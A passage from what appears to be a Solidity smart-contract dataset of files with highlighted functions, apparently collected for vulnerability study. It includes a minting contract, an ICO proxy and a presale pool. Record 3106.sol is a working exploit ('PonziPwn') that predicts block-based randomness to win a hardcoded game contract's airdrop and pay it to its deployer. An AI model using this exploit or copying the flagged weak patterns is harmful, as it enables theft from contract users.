assert(periods.length > 0);\n return periods.length.sub(1);\n }\n function calculateEmission(uint _period, uint _value) internal view returns (uint, uint) {\n Period storage currentPeriod = periods[_period];\n uint minting = currentPeriod.minting;\n uint totalReceived = currentPeriod.totalReceived;\n uint scaledValue = _value;\n if (totalReceived > MAX_RECEIVED_PER_PERIOD) {\n scaledValue = _value.mul(MAX_RECEIVED_PER_PERIOD).div(totalReceived);\n }\n uint emission = scaledValue.mul(minting).div(MAX_RECEIVED_PER_PERIOD);\n return (emission, scaledValue);\n }\n function mint(address _account, uint _value) internal {\n balances[_account] = balances[_account].add(_value);\n totalSupply_ = totalSupply_.add(_value);\n }\n function getPeriodStarted(uint _period) public view validPeriod(_period) returns (uint) {\n return periods[_period].started;\n }\n function getPeriodTotalReceived(uint _period) public view validPeriod(_period) returns (uint) {\n return periods[_period].totalReceived;\n }\n function getPeriodOwnerLockedBalance(uint _period) public view validPeriod(_period) returns (uint) {\n return periods[_period].ownerLockedBalance;\n }\n function getPeriodMinting(uint _period) public view validPeriod(_period) returns (uint) {\n return periods[_period].minting;\n }\n function getPeriodSealedPurchaseOrderFor(uint _period, address _account) public view validPeriod(_period) returns (bytes32) {\n return periods[_period].sealedPurchaseOrders[_account];\n }\n function getPeriodReceivedBalanceFor(uint _period, address _account) public view validPeriod(_period) returns (uint) {\n return periods[_period].receivedBalances[_account];\n }\n function getPeriodLockedBalanceFor(uint _period, address _account) public view validPeriod(_period) returns (uint) {\n return periods[_period].lockedBalances[_account];\n }\n function getPeriodAliasFor(uint _period, address _account) public view validPeriod(_period) returns (address) {\n return periods[_period].aliases[_account];\n }\n}",
  "extract_feature": [
    "function nextPeriod() public {\nuint periodIndex = currentPeriodIndex();\nuint periodIndexNext = periodIndex.add(1);\nrequire(block.number.sub(periods[periodIndex].started) > PERIOD_BLOCKS);\nperiods.push(Period(block.number, 0, 0, calculateMinting(periodIndexNext)));\nemit NextPeriod(periodIndexNext, block.number);\n}",
    "function placePurchaseOrder(bytes32 _sealedPurchaseOrder) public payable {\nif (block.number.sub(periods[currentPeriodIndex()].started) > PERIOD_BLOCKS) {\nnextPeriod();\n}\nPeriod storage period = periods[currentPeriodIndex()];\nrequire(period.sealedPurchaseOrders[msg.sender] == bytes32(0));\nperiod.sealedPurchaseOrders[msg.sender] = _sealedPurchaseOrder;\nperiod.receivedBalances[msg.sender] = msg.value;\nemit SealedOrderPlaced(msg.sender, currentPeriodIndex(), msg.value);\n}",
    "function placeOpenPurchaseOrder(address _alias) public payable {\nrequire(_alias != address(0));\nif (block.number.sub(periods[currentPeriodIndex()].started) > PERIOD_BLOCKS) {\nnextPeriod();\n}\nPeriod storage period = periods[currentPeriodIndex()];\nrequire(period.aliases[msg.sender] == address(0));\nperiod.totalReceived = period.totalReceived.add(msg.value);\nperiod.receivedBalances[msg.sender] = msg.value;\nperiod.aliases[msg.sender] = _alias;\nemit OpenOrderPlaced(msg.sender, currentPeriodIndex(), _alias, msg.value);\n}",
    "function withdraw(address _from, uint _period) public {\nrequire(currentPeriodIndex() > _period);\nPeriod storage period = periods[_period];\nrequire(block.number.sub(period.started) > USER_LOCK_BLOCKS);\nuint balance = period.lockedBalances[_from];\nrequire(balance <= address(this).balance);\ndelete period.lockedBalances[_from];\naddress alias = period.aliases[_from];\nalias.transfer(balance);\n}",
    "function withdrawOwner(uint _period) public onlyOwner {\nrequire(currentPeriodIndex() > _period);\nPeriod storage period = periods[_period];\nrequire(block.number.sub(period.started) > OWNER_LOCK_BLOCKS);\nuint balance = period.ownerLockedBalance;\nrequire(balance <= address(this).balance);\ndelete period.ownerLockedBalance;\nownerAlias.transfer(balance);\n}",
    "function withdrawOwnerUnrevealed(uint _period, address _from) public onlyOwner {\nrequire(currentPeriodIndex() > _period.add(1));\nPeriod storage period = periods[_period];\nrequire(block.number.sub(period.started) > OWNER_LOCK_BLOCKS);\nuint balance = period.receivedBalances[_from];\nrequire(balance <= address(this).balance);\ndelete period.receivedBalances[_from];\nownerAlias.transfer(balance);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b6e"
  },
  "filename": "3106.sol",
  "content": "pragma solidity ^0.4.24;\ninterface GameOfSwordsInterface {\n function airDropTracker_() external returns (uint256);\n function airDropPot_() external returns (uint256);\n function withdraw() external;\n}\ncontract BlankContract {\n constructor() public {}\n}\ncontract AirDropWinner {\n GameOfSwordsInterface private fomo3d = GameOfSwordsInterface(0xE7d2c826292CE8bDd5e51Ce44fff4033Be657269);\n constructor() public {\n if(!address(fomo3d).call.value(0.1 ether)()) {\n fomo3d.withdraw();\n selfdestruct(msg.sender);\n }\n }\n}\ncontract PonziPwn {\n GameOfSwordsInterface private fomo3d = GameOfSwordsInterface(0xE7d2c826292CE8bDd5e51Ce44fff4033Be657269);\n address private admin;\n uint256 private blankContractGasLimit = 20000;\n uint256 private pwnContractGasLimit = 250000;\n uint256 private gasPrice = 10;\n uint256 private gasPriceInWei = gasPrice*1e9;\n uint256 private blankContractCost = blankContractGasLimit*gasPrice ;\n uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;\n uint256 private maxAmount = 10 ether;\n modifier onlyAdmin() {\n require(msg.sender == admin);\n _;\n }\n constructor() public {\n admin = msg.sender;\n }\n function checkPwnData() private returns(uint256,uint256,address) {\n address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));\n uint256 _nContracts = 0;\n uint256 _pwnCost = 0;\n uint256 _seed = 0;\n uint256 _tracker = fomo3d.airDropTracker_();\n bool _canWin = false;\n while(!_canWin) {\n _seed = uint256(keccak256(abi.encodePacked(\n (block.timestamp) +\n (block.difficulty) +\n ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +\n (block.gaslimit) +\n ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +\n (block.number)\n )));\n if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {\n _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));\n _nContracts++;\n _pwnCost+= blankContractCost;\n } else {\n _canWin = true;\n _pwnCost += pwnContractCost;\n }\n }\n return (_pwnCost,_nContracts,_newSender);\n }\n function deployContracts(uint256 _nContracts,address _newSender) private {\n for(uint256 _i; _i < _nContracts; _i++) {\n if(_i++ == _nContracts) {\n address(_newSender).call.value(0.1 ether)();\n new AirDropWinner();\n }\n new BlankContract();\n }\n }\n function beginPwn() public onlyAdmin() {\n uint256 _pwnCost;\n uint256 _nContracts;\n address _newSender;\n (_pwnCost, _nContracts,_newSender) = checkPwnData();\n if(_pwnCost + 0.1 ether < maxAmount) {\n deployContracts(_nContracts,_newSender);\n }\n }\n function withdraw() public onlyAdmin() {\n admin.transfer(address(this).balance);\n }\n}",
  "extract_feature": [
    "function checkPwnData() private returns(uint256,uint256,address) {\naddress _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));\nuint256 _nContracts = 0;\nuint256 _pwnCost = 0;\nuint256 _seed = 0;\nuint256 _tracker = fomo3d.airDropTracker_();\nbool _canWin = false;\nwhile(!_canWin) {\n_seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp) +\n(block.difficulty) +\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +\n(block.gaslimit) +\n((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +\n(block.number)\n)));\nif((_seed - ((_seed / 1000) * 1000)) >= _tracker) {\n_newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));\n_nContracts++;\n_pwnCost+= blankContractCost;\n} else {\n_canWin = true;\n_pwnCost += pwnContractCost;\n}\n}\nreturn (_pwnCost,_nContracts,_newSender);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b6f"
  },
  "filename": "3123.sol",
  "content": "pragma solidity 0.4.24;\ncontract Owned {\n address public owner = msg.sender;\n constructor(address _owner) public {\n if ( _owner == 0x00 ) {\n _owner = msg.sender;\n }\n owner = _owner;\n }\n function replaceOwner(address _owner) external returns(bool) {\n require( isOwner() );\n owner = _owner;\n return true;\n }\n function isOwner() internal view returns(bool) {\n return owner == msg.sender;\n }\n modifier forOwner {\n require( isOwner() );\n _;\n }\n}\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns(uint256 c) {\n c = a + b;\n assert( c >= a );\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns(uint256 c) {\n c = a - b;\n assert( c <= a );\n return c;\n }\n function mul(uint256 a, uint256 b) internal pure returns(uint256 c) {\n c = a * b;\n assert( c == 0 || c / a == b );\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns(uint256) {\n return a / b;\n }\n function pow(uint256 a, uint256 b) internal pure returns(uint256 c) {\n c = a ** b;\n assert( c % a == 0 );\n return a ** b;\n }\n}\ncontract TokenDB is Owned {\n function transfer(address _from, address _to, uint256 _amount) external returns(bool _success) {}\n function bulkTransfer(address _from, address[] _to, uint256[] _amount) external returns(bool _success) {}\n function setAllowance(address _owner, address _spender, uint256 _amount) external returns(bool _success) {}\n function getAllowance(address _owner, address _spender) public view returns(bool _success, uint256 _remaining) {}\n function balanceOf(address _owner) public view returns(bool _success, uint256 _balance) {}\n}\ncontract Token is Owned {\n using SafeMath for uint256;\n string public name = \"Inlock token\";\n string public symbol = \"ILK\";\n uint8 public decimals = 8;\n uint256 public totalSupply = 44e16;\n address public libAddress;\n TokenDB public db;\n Ico public ico;\n function () public { revert(); }\n function changeLibAddress(address _libAddress) external forOwner {}\n function changeDBAddress(address _dbAddress) external forOwner {}\n function changeIcoAddress(address _icoAddress) external forOwner {}\n function approve(address _spender, uint256 _value) external returns (bool _success) {}\n function transfer(address _to, uint256 _amount) external returns (bool _success) {}\n function bulkTransfer(address[] _to, uint256[] _amount) external returns (bool _success) {}\n function transferFrom(address _from, address _to, uint256 _amount) external returns (bool _success) {}\n function allowance(address _owner, address _spender) public view returns (uint256 _remaining) {}\n function balanceOf(address _owner) public view returns (uint256 _balance) {}\n event AllowanceUsed(address indexed _spender, address indexed _owner, uint256 indexed _value);\n event Mint(address indexed _addr, uint256 indexed _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n}\ncontract Ico is Owned {\n using SafeMath for uint256;\n enum phaseType {\n pause,\n privateSale1,\n privateSale2,\n sales1,\n sales2,\n sales3,\n sales4,\n preFinish,\n finish\n }\n struct vesting_s {\n uint256 amount;\n uint256 startBlock;\n uint256 endBlock;\n uint256 claimedAmount;\n }\n mapping(address => bool) public KYC;\n mapping(address => bool) public transferRight;\n mapping(address => vesting_s) public vesting;\n phaseType public currentPhase;\n uint256 public currentRate;\n uint256 public currentRateM = 1e3;\n uint256 public privateSale1Hardcap = 4e16;\n uint256 public privateSale2Hardcap = 64e15;\n uint256 public thisBalance = 44e16;\n address public offchainUploaderAddress;\n address public setKYCAddress;\n address public setRateAddress;\n address public libAddress;\n Token public token;\n constructor(address _owner, address _libAddress, address _tokenAddress, address _offchainUploaderAddress,\n address _setKYCAddress, address _setRateAddress) Owned(_owner) public {\n currentPhase = phaseType.pause;\n libAddress = _libAddress;\n token = Token(_tokenAddress);\n offchainUploaderAddress = _offchainUploaderAddress;\n setKYCAddress = _setKYCAddress;\n setRateAddress = _setRateAddress;\n }\n function () public payable {\n buy();\n }\n function changeLibAddress(address _libAddress) external forOwner {\n libAddress = _libAddress;\n }\n function changeOffchainUploaderAddress(address _offchainUploaderAddress) external forOwner {\n offchainUploaderAddress = _offchainUploaderAddress;\n }\n function changeKYCAddress(address _setKYCAddress) external forOwner {\n setKYCAddress = _setKYCAddress;\n }\n function changeSetRateAddress(address _setRateAddress) external forOwner {\n setRateAddress = _setRateAddress;\n }\n function setVesting(address _beneficiary, uint256 _amount, uint256 _startBlock, uint256 _endBlock) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function claimVesting() external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function setKYC(address[] _on, address[] _off) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function setTransferRight(address[] _allow, address[] _disallow) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function setCurrentRate(uint256 _currentRate) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function setCurrentPhase(phaseType _phase) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function offchainUpload(address[] _beneficiaries, uint256[] _rewards) external {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function buy() public payable {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0)\n }\n }\n }\n function allowTransfer(address _owner) public view returns (bool _success, bool _allow) {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0x40)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0x40)\n }\n }\n }\n function calculateReward(uint256 _input) public view returns (bool _success, uint256 _reward) {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0x40)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0x40)\n }\n }\n }\n function calcVesting(address _owner) public view returns(bool _success, uint256 _reward) {\n address _trg = libAddress;\n assembly {\n let m := mload(0x40)\n calldatacopy(m, 0, calldatasize)\n let success := delegatecall(gas, _trg, m, calldatasize, m, 0x40)\n switch success case 0 {\n revert(0, 0)\n } default {\n return(m, 0x40)\n }\n }\n }\n event Brought(address _owner, address _beneficiary, uint256 _input, uint256 _output);\n event VestingDefined(address _beneficiary, uint256 _amount, uint256 _startBlock, uint256 _endBlock);\n event VestingClaimed(address _beneficiary, uint256 _amount);\n}\ncontract IcoLib is Ico {\n constructor(address _owner, address _tokenAddress, address _offchainUploaderAddress, address _setKYCAddress, address _setRateAddress)\n Ico(_owner, 0x00, _tokenAddress, _offchainUploaderAddress, _setKYCAddress, _setRateAddress) public {}\n function setVesting(address _beneficiary, uint256 _amount, uint256 _startBlock, uint256 _endBlock) external forOwner {\n require( _beneficiary != 0x00 );\n thisBalance = thisBalance.add( vesting[_beneficiary].amount.sub(vesting[_beneficiary].claimedAmount) );\n if ( _amount == 0 ) {\n delete vesting[_beneficiary];\n emit VestingDefined(_beneficiary, 0, 0, 0);\n } else {\n require( _endBlock > _startBlock );\n vesting[_beneficiary] = vesting_s(\n _amount,\n _startBlock,\n _endBlock,\n 0\n );\n thisBalance = thisBalance.sub( _amount );\n emit VestingDefined(_beneficiary, _amount, _startBlock, _endBlock);\n }\n }\n function claimVesting() external {\n uint256 _reward;\n bool _subResult;\n ( _subResult, _reward ) = calcVesting(msg.sender);\n require( _subResult && _reward > 0 );\n vesting[msg.sender].claimedAmount = vesting[msg.sender].claimedAmount.add(_reward);\n require( token.transfer(msg.sender, _reward) );\n }\n function setKYC(address[] _on, address[] _off) external {\n uint256 i;\n require( msg.sender == setKYCAddress );\n for ( i=0 ; i<_on.length ; i++ ) {\n KYC[_on[i]] = true;\n }\n for ( i=0 ; i<_off.length ; i++ ) {\n delete KYC[_off[i]];\n }\n }\n function setTransferRight(address[] _allow, address[] _disallow) external forOwner {\n uint256 i;\n for ( i=0 ; i<_allow.length ; i++ ) {\n transferRight[_allow[i]] = true;\n }\n for ( i=0 ; i<_disallow.length ; i++ ) {\n delete transferRight[_disallow[i]];\n }\n }\n function setCurrentRate(uint256 _currentRate) external {\n require( msg.sender == setRateAddress );\n require( _currentRate >= currentRateM );\n currentRate = _currentRate;\n }\n function setCurrentPhase(phaseType _phase) external forOwner {\n currentPhase = _phase;\n }\n function offchainUpload(address[] _beneficiaries, uint256[] _rewards) external {\n uint256 i;\n uint256 _totalReward;\n require( msg.sender == offchainUploaderAddress );\n require( currentPhase != phaseType.pause && currentPhase != phaseType.finish );\n require( _beneficiaries.length == _rewards.length );\n for ( i=0 ; i<_rewards.length ; i++ ) {\n _totalReward = _totalReward.add(_rewards[i]);\n emit Brought(msg.sender, _beneficiaries[i], 0, _rewards[i]);\n }\n thisBalance = thisBalance.sub(_totalReward);\n if ( currentPhase == phaseType.privateSale1 ) {\n privateSale1Hardcap = privateSale1Hardcap.sub(_totalReward);\n } else if ( currentPhase == phaseType.privateSale2 ) {\n privateSale2Hardcap = privateSale2Hardcap.sub(_totalReward);\n }\n token.bulkTransfer(_beneficiaries, _rewards);\n }\n function buy() public payable {\n uint256 _reward;\n bool _subResult;\n require( currentPhase == phaseType.privateSale2 ||\n currentPhase == phaseType.sales1 ||\n currentPhase == phaseType.sales2 ||\n currentPhase == phaseType.sales3 ||\n currentPhase == phaseType.sales4 ||\n currentPhase == phaseType.preFinish\n );\n require( KYC[msg.sender] );\n ( _subResult, _reward ) = calculateReward(msg.value);\n require( _reward > 0 && _subResult );\n thisBalance = thisBalance.sub(_reward);\n require( owner.send(msg.value) );\n if ( currentPhase == phaseType.privateSale1 ) {\n privateSale1Hardcap = privateSale1Hardcap.sub(_reward);\n } else if ( currentPhase == phaseType.privateSale2 ) {\n privateSale2Hardcap = privateSale2Hardcap.sub(_reward);\n }\n require( token.transfer(msg.sender, _reward) );\n emit Brought(msg.sender, msg.sender, msg.value, _reward);\n }\n function allowTransfer(address _owner) public view returns (bool _success, bool _allow) {\n return ( true, _owner == address(this) || transferRight[_owner] || currentPhase == phaseType.preFinish || currentPhase == phaseType.finish );\n }\n function calculateReward(uint256 _input) public view returns (bool _success, uint256 _reward) {\n uint256 _amount;\n _success = true;\n if ( currentRate == 0 || _input == 0 ) {\n return;\n }\n _amount = _input.mul(1e8).mul(100).mul(currentRate).div(1e18).div(currentRateM);\n if ( _amount == 0 ) {\n return;\n }\n if ( currentPhase == phaseType.privateSale1 ) {\n if ( _amount >= 25e13 ) {\n _reward = _amount.mul(142).div(100);\n } else if ( _amount >= 10e13 ) {\n _reward = _amount.mul(137).div(100);\n } else if ( _amount >= 2e13 ) {\n _reward = _amount.mul(133).div(100);\n }\n if ( _reward > 0 && privateSale1Hardcap < _reward ) {\n _reward = 0;\n }\n } else if ( currentPhase == phaseType.privateSale2 ) {\n if ( _amount >= 125e13 ) {\n _reward = _amount.mul(129).div(100);\n } else if ( _amount >= 100e13 ) {\n _reward = _amount.mul(124).div(100);\n } else if ( _amount >= 10e13 ) {\n _reward = _amount.mul(121).div(100);\n }\n if ( _reward > 0 && privateSale2Hardcap < _reward ) {\n _reward = 0;\n }\n } else if ( currentPhase == phaseType.sales1 ) {\n if ( _amount >= 1e12 ) {\n _reward = _amount.mul(117).div(100);\n }\n } else if ( currentPhase == phaseType.sales2 ) {\n if ( _amount >= 1e12 ) {\n _reward = _amount.mul(112).div(100);\n }\n } else if ( currentPhase == phaseType.sales3 ) {\n if ( _amount >= 1e12 ) {\n _reward = _amount.mul(109).div(100);\n }\n } else if ( currentPhase == phaseType.sales4 ) {\n if ( _amount >= 1e12 ) {\n _reward = _amount.mul(102).div(100);\n }\n } else if ( currentPhase == phaseType.preFinish ) {\n _reward = _amount;\n }\n if ( thisBalance < _reward ) {\n _reward = 0;\n }\n }\n function calcVesting(address _owner) public view returns(bool _success, uint256 _reward) {\n vesting_s memory _vesting = vesting[_owner];\n if ( _vesting.amount == 0 || block.number < _vesting.startBlock ) {\n return ( true, 0 );\n }\n _reward = _vesting.amount.mul( block.number.sub(_vesting.startBlock) ).div( _vesting.endBlock.sub(_vesting.startBlock) );\n if ( _reward > _vesting.amount ) {\n _reward = _vesting.amount;\n }\n if ( _reward <= _vesting.claimedAmount ) {\n return ( true, 0 );\n }\n return ( true, _reward.sub(_vesting.claimedAmount) );\n }\n}",
  "extract_feature": [
    "function calcVesting(address _owner) public view returns(bool _success, uint256 _reward) {\nvesting_s memory _vesting = vesting[_owner];\nif ( _vesting.amount == 0 || block.number < _vesting.startBlock ) {\nreturn ( true, 0 );\n}\n_reward = _vesting.amount.mul( block.number.sub(_vesting.startBlock) ).div( _vesting.endBlock.sub(_vesting.startBlock) );\nif ( _reward > _vesting.amount ) {\n_reward = _vesting.amount;\n}\nif ( _reward <= _vesting.claimedAmount ) {\nreturn ( true, 0 );\n}\nreturn ( true, _reward.sub(_vesting.claimedAmount) );\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6b750a970a4fdc0b70"
  },
  "filename": "3132.sol",
  "content": "pragma solidity ^0.4.19;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ninterface ERC20 {\n function balanceOf(address _owner) external returns (uint256 balance);\n function transfer(address _to, uint256 _value) external returns (bool success);\n}\ninterface WhiteList {\n function isPaidUntil (address addr) external view returns (uint);\n}\ncontract PresalePool {\n using SafeMath for uint;\n uint8 public contractStage = 1;\n address public owner;\n uint maxContractBalance;\n uint contributionCap;\n uint public feePct;\n address public receiverAddress;\n uint constant public contributionMin = 100000000000000000;\n uint constant public maxGasPrice = 50000000000;\n WhiteList constant public whitelistContract = WhiteList(0xf6E386FA4794B58350e7B4Cb32B6f86Fb0F357d4);\n bool whitelistIsActive = true;\n uint public nextCapTime;\n uint public nextContributionCap;\n uint public addressChangeBlock;\n uint public finalBalance;\n uint[] public ethRefundAmount;\n address public activeToken;\n struct Contributor {\n uint ethRefund;\n uint balance;\n uint cap;\n mapping (address => uint) tokensClaimed;\n }\n mapping (address => Contributor) whitelist;\n struct TokenAllocation {\n ERC20 token;\n uint[] pct;\n uint balanceRemaining;\n }\n mapping (address => TokenAllocation) distributionMap;\n modifier onlyOwner () {\n require (msg.sender == owner);\n _;\n }\n bool locked;\n modifier noReentrancy() {\n require(!locked);\n locked = true;\n _;\n locked = false;\n }\n event ContributorBalanceChanged (address contributor, uint totalBalance);\n event ReceiverAddressSet ( address _addr);\n event PoolSubmitted (address receiver, uint amount);\n event WithdrawalsOpen (address tokenAddr);\n event TokensWithdrawn (address receiver, address token, uint amount);\n event EthRefundReceived (address sender, uint amount);\n event EthRefunded (address receiver, uint amount);\n event ERC223Received (address token, uint value);\n function _toPct (uint numerator, uint denominator ) internal pure returns (uint) {\n return numerator.mul(10 ** 20) / denominator;\n }\n function _applyPct (uint numerator, uint pct) internal pure returns (uint) {\n return numerator.mul(pct) / (10 ** 20);\n }\n function PresalePool (address receiverAddr, uint contractCap, uint cap, uint fee) public {\n require (fee < 100);\n require (contractCap >= cap);\n owner = msg.sender;\n receiverAddress = receiverAddr;\n maxContractBalance = contractCap;\n contributionCap = cap;\n feePct = _toPct(fee,100);\n }\n function () payable public {\n if (contractStage == 1) {\n _ethDeposit();\n } else _ethRefund();\n }\n function _ethDeposit () internal {\n assert (contractStage == 1);\n require (!whitelistIsActive || whitelistContract.isPaidUntil(msg.sender) > now);\n require (tx.gasprice <= maxGasPrice);\n require (this.balance <= maxContractBalance);\n var c = whitelist[msg.sender];\n uint newBalance = c.balance.add(msg.value);\n require (newBalance >= contributionMin);\n if (nextCapTime > 0 && nextCapTime < now) {\n contributionCap = nextContributionCap;\n nextCapTime = 0;\n }\n if (c.cap > 0) require (newBalance <= c.cap);\n else require (newBalance <= contributionCap);\n c.balance = newBalance;\n ContributorBalanceChanged(msg.sender, newBalance);\n }\n function _ethRefund () internal {\n assert (contractStage == 2);\n require (msg.sender == owner || msg.sender == receiverAddress);\n require (msg.value >= contributionMin);\n ethRefundAmount.push(msg.value);\n EthRefundReceived(msg.sender, msg.value);\n }\n function withdraw (address tokenAddr) public {\n var c = whitelist[msg.sender];\n require (c.balance > 0);\n if (contractStage == 1) {\n uint amountToTransfer = c.balance;\n c.balance = 0;\n msg.sender.transfer(amountToTransfer);\n ContributorBalanceChanged(msg.sender, 0);\n } else {\n _withdraw(msg.sender,tokenAddr);\n }\n }\n function withdrawFor (address contributor, address tokenAddr) public onlyOwner {\n require (contractStage == 2);\n require (whitelist[contributor].balance > 0);\n _withdraw(contributor,tokenAddr);\n }\n function _withdraw (address receiver, address tokenAddr) internal {\n assert (contractStage == 2);\n var c = whitelist[receiver];\n if (tokenAddr == 0x00) {\n tokenAddr = activeToken;\n }\n var d = distributionMap[tokenAddr];\n require ( (ethRefundAmount.length > c.ethRefund) || d.pct.length > c.tokensClaimed[tokenAddr] );\n if (ethRefundAmount.length > c.ethRefund) {\n uint pct = _toPct(c.balance,finalBalance);\n uint ethAmount = 0;\n for (uint i=c.ethRefund; i<ethRefundAmount.length; i++) {\n ethAmount = ethAmount.add(_applyPct(ethRefundAmount[i],pct));\n }\n c.ethRefund = ethRefundAmount.length;\n if (ethAmount > 0) {\n receiver.transfer(ethAmount);\n EthRefunded(receiver,ethAmount);\n }\n }\n if (d.pct.length > c.tokensClaimed[tokenAddr]) {\n uint tokenAmount = 0;\n for (i=c.tokensClaimed[tokenAddr]; i<d.pct.length; i++) {\n tokenAmount = tokenAmount.add(_applyPct(c.balance,d.pct[i]));\n }\n c.tokensClaimed[tokenAddr] = d.pct.length;\n if (tokenAmount > 0) {\n require(d.token.transfer(receiver,tokenAmount));\n d.balanceRemaining = d.balanceRemaining.sub(tokenAmount);\n TokensWithdrawn(receiver,tokenAddr,tokenAmount);\n }\n }\n }\n function modifyIndividualCap (address addr, uint cap) public onlyOwner {\n require (contractStage == 1);\n require (cap <= maxContractBalance);\n var c = whitelist[addr];\n require (cap >= c.balance);\n c.cap = cap;\n }\n function modifyCap (uint cap) public onlyOwner {\n require (contractStage == 1);\n require (contributionCap <= cap && maxContractBalance >= cap);\n contributionCap = cap;\n nextCapTime = 0;\n }\n function modifyNextCap (uint time, uint cap) public onlyOwner {\n require (contractStage == 1);\n require (contributionCap <= cap && maxContractBalance >= cap);\n require (time > now);\n nextCapTime = time;\n nextContributionCap = cap;\n }\n function modifyMaxContractBalance (uint amount) public onlyOwner {\n require (contractStage == 1);\n require (amount >= contributionMin);\n require (amount >= this.balance);\n maxContractBalance = amount;\n if (amount < contributionCap) contributionCap = amount;\n }\n function toggleWhitelist (bool active) public onlyOwner {\n whitelistIsActive = active;\n }\n function checkPoolBalance () view public returns (uint poolCap, uint balance, uint remaining) {\n if (contractStage == 1) {\n remaining = maxContractBalance.sub(this.balance);\n } else {\n remaining = 0;\n }\n return (maxContractBalance,this.balance,remaining);\n }\n function checkContributorBalance (address addr) view public returns (uint balance, uint cap, uint remaining) {\n var c = whitelist[addr];\n if (contractStage == 2) return (c.balance,0,0);\n if (whitelistIsActive && whitelistContract.isPaidUntil(addr) < now) return (c.balance,0,0);\n if (c.cap > 0) cap = c.cap;\n else cap = contributionCap;\n if (cap.sub(c.balance) > maxContractBalance.sub(this.balance)) return (c.balance, cap, maxContractBalance.sub(this.balance));\n return (c.balance, cap, cap.sub(c.balance));\n }\n function checkAvailableTokens (address addr, address tokenAddr) view public returns (uint tokenAmount) {\n var c = whitelist[addr];\n var d = distributionMap[tokenAddr];\n for (uint i = c.tokensClaimed[tokenAddr]; i < d.pct.length; i++) {\n tokenAmount = tokenAmount.add(_applyPct(c.balance, d.pct[i]));\n }\n return tokenAmount;\n }\n function setReceiverAddress (address addr) public onlyOwner {\n require (contractStage == 1);\n receiverAddress = addr;\n addressChangeBlock = block.number;\n ReceiverAddressSet(addr);\n }\n function submitPool (uint amountInWei) public onlyOwner noReentrancy {\n require (contractStage == 1);\n require (receiverAddress != 0x00);\n require (block.number >= addressChangeBlock.add(6000));\n if (amountInWei == 0) amountInWei = this.balance;\n require (contributionMin <= amountInWei && amountInWei <= this.balance);\n finalBalance = this.balance;\n require (receiverAddress.call.value(amountInWei).gas(msg.gas.sub(5000))());\n if (this.balance > 0) ethRefundAmount.push(this.balance);\n contractStage = 2;\n PoolSubmitted(receiverAddress, amountInWei);\n }\n function enableTokenWithdrawals (address tokenAddr, bool notDefault) public onlyOwner noReentrancy {\n require (contractStage == 2);\n if (notDefault) {\n require (activeToken != 0x00);\n } else {\n activeToken = tokenAddr;\n }\n var d = distributionMap[tokenAddr];\n if (d.pct.length==0) d.token = 